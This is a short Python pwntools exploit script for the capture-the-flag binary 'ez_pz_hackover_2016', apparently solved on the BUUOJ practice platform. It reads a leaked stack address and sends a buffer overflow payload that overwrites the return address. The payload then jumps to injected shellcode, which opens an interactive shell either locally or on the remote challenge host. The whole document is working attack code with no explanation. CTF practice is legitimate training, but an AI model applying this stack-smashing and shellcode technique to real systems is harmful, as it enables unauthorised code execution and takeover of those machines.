import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	#try :
		if len(sys.argv)==1 :
			io=process('./ez_pz_hackover_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ez_pz_hackover_2016')
			libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
		else :
			io=remote('node3.buuoj.cn',28943)
			elf=ELF('ez_pz_hackover_2016')
			#libc=ELF('./libc.so')
		
		io.recvuntil('0x')
		sh=int(io.recv(8),16)+0x4
		pay='crashme'
		pay=pay.ljust(0x36-0x1c,'\x00')
		pay+=p32(sh)
		pay=pay.ljust(0x40,'\x00')
		pay+=asm(shellcraft.sh())
		io.recv()
		#gdb.attach(io)
		io.sendline(pay)
		io.interactive()


	#except Exception as e:
		#raise e
	#else:
		#pass